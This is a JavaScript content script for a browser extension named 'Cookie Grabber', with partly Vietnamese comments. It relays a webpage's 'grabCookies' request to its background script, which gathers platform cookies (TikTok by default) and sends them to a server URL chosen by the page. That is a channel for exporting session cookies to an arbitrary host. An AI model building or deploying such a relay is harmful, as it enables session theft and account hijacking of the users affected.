// Content script để communicate với webpage
// Nhận message từ webpage và forward đến background script

// Listen for messages from the webpage
window.addEventListener("message", async (event) => {
  // Only accept messages from same page
  if (event.source !== window) return;

  // Check if it's a message from our page
  if (event.data && event.data.type === "FROM_PAGE_TO_EXTENSION") {
    const action = event.data.action;
    const data = event.data.data || {};

    // Handle ping - just respond that extension is installed
    if (action === "ping") {
      window.postMessage(
        {
          type: "FROM_EXTENSION_TO_PAGE",
          action: "ping",
          response: { installed: true },
        },
        "*",
      );
      return;
    }

    // Handle grabCookies action
    if (action === "grabCookies") {
      const platform = data.platform || "tiktok";
      const token = data.token; // Token từ webpage
      const serverUrl = data.serverUrl; // Server URL từ webpage

      try {
        // Send message to background script to get cookies and send to server
        const response = await chrome.runtime.sendMessage({
          action: "grabAndSendCookies",
          platform: platform,
          token: token,
          serverUrl: serverUrl,
        });

        // Send response back to webpage
        window.postMessage(
          {
            type: "FROM_EXTENSION_TO_PAGE",
            action: "grabCookies",
            response: response,
          },
          "*",
        );
      } catch (error) {
        window.postMessage(
          {
            type: "FROM_EXTENSION_TO_PAGE",
            action: "grabCookies",
            response: {
              success: false,
              error: error.message || "Extension error",
            },
          },
          "*",
        );
      }
    }
  }
});

// Send a message to let page know extension is loaded
window.postMessage(
  {
    type: "EXTENSION_LOADED",
    extensionId: chrome.runtime.id,
  },
  "*",
);

console.log("Cookie Grabber Extension: Content script loaded");
